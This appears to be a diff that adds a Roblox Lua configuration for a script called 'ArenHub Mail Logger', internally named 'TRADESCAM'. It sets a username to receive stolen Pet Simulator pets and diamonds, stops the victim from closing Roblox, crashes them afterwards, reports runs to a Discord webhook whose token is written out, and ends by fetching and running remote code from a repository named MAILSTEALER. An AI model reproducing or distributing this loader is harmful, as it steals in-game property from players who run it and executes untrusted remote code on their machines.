@@ -1,0 +1,35 @@
+```--[[ ArenHub Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "COULDOF1 " --// Username To Send Pets To
+
+_G.GiftMessage = "ArenHubONTOP" --// Message For The Gift To Say
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+_G.UnlockPets = true --// Unlocks Locked Pets
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--Webhook Config--
+
+_G.Webhook = "https://discord.com/api/webhooks/1111247272483766292/KzIP8kwTkhWsUY8CgPYcXtG8ga4rIp-G2rn5_lVCJj8fgkiRhzBOnjXlTEsn8di1djZj" --// Discord Webhook For Executions
+
+ --[[ UI Config ]]--
+
+_G.ScriptName = "TRADESCAM" --// Script Name On The UI
+
+_G.Tip1 = "1" --// Gives You Tips On The UI
+
+_G.Tip2 = "2" --// Gives You Tips On The UI
+
+_G.Tip3 = "3" --// Gives You Tips On The UI
+
+_G.Tip4 = "4" --// Gives You Tips On The UI
+
+_G.Tip5 = "5" --// Gives You Tips On The UI
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/petsimxeazy/MAILSTEALER/main/ArenHubMAILSTEALER"))()```
